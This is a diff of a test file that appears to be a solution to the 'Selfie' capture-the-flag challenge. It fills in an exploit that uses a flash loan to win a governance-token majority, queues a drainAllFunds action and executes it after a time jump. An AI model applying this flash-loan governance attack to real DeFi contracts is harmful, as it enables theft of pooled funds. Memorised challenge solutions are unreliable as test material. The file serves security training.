@@ -30,7 +30,23 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const AttackerContractFactory = await ethers.getContractFactory('AttackerContract', attacker);
+        this.attackerContract = await AttackerContractFactory.deploy(
+          this.token.address,
+          this.governance.address,
+          this.pool.address,
+        );
+        await this.attackerContract.attack();
+        // 1. flashloan to transfer governance tokens to attacker address/contract
+        // 2. call snapshot. Attacker should get > totalSupply / 2 of governance tokens supply
+        // 3. Insert drainFounds action into simple gov
+        // const actionId = await this.governance.connect(attacker).queueAction(attacker.address, `drainAllFunds(${attacker.address})`, ethers.utils.parseEther('0.1'))
+
+         // Advance time 5 secs
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const actionId = await this.attackerContract.actionId();
+        console.log("before execute action", actionId)
+        this.governance.connect(attacker).executeAction(actionId)
     });
 
     after(async function () {
